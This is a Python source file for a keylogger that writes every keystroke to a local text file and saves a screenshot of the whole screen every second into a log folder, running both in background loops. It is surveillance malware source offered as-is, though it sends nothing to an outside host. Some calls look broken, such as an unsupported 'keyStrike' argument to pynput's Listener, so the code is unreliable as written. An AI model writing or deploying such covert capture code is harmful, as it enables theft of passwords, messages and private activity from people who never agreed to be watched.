from mss import mss
from pynput.keyboard import Listener
import os
from threading import Timer, Thread
#import datetime
import time

'''
This class sets a time to execute a process on interval
'''
class FrequencyTimer(Timer):
    #this method controls the delays, @self : this instance of FrequencyTimer
    def start(self):
        while not self.finished.wait(self.interval):
            #create timer for program to use on interval
            self.function(*self.args, **self.kwargs)

class Keylogger:
    pass
    
    '''
    this meathod takes a keylogger instance and a key and
    writes the key to a file
    @self : this instance of Keylogger
    @key : the key that was pressed
    '''
    def _keyStrike(self, key):
        #open file 
        with open('./log/keylog/keys.txt', 'a') as file:
            #append key passed
            file.write(key)
    
    '''
    this meathod sets up the folders for saving
    the text file and screenshots images
    @self : this instance of Keylogger
    '''
    def _setupDir(self):
        if not os.path.exists('./log'):
            os.mkdir('./log') #create parent log directory
            os.mkdir('./log/keylog') #create directory for keylog text file
            os.mkdir('./log/screenshots/') #create directory for storing screenshots
    '''
    this method uses mms libary to take screenshots
    @self : this instance of Keylogger
    '''
    def _screenCapture(self):
        capture = mss() #create instance of mss
        #capture.shot(output='./log/screenshots/{}.png'.format(datetime.datetime.now()))
        capture.shot(output='./log/screenshots/{}.png'.format(time.time()))

    '''
    this method "listens" for keyboard events
    '''
    def _keyScript(self):
        with Listener(keyStrike=self._keyStrike) as listen:
            listen.join()
    
    '''
    this method is the main meathod to run a keylogger instance
    @self : this instance of Keylogger
    @frequency : interval for screenshots , default is 1
    '''
    def exe(self, frequency = 1):
        self._setupDir()
        Thread(target=self._keyScript).start()
        FrequencyTimer(frequency, self._screenCapture).start()
        
    
    
 #main: create Keylogger instance and run it
if __name__== "__main__":
    logger = Keylogger()
    logger.exe()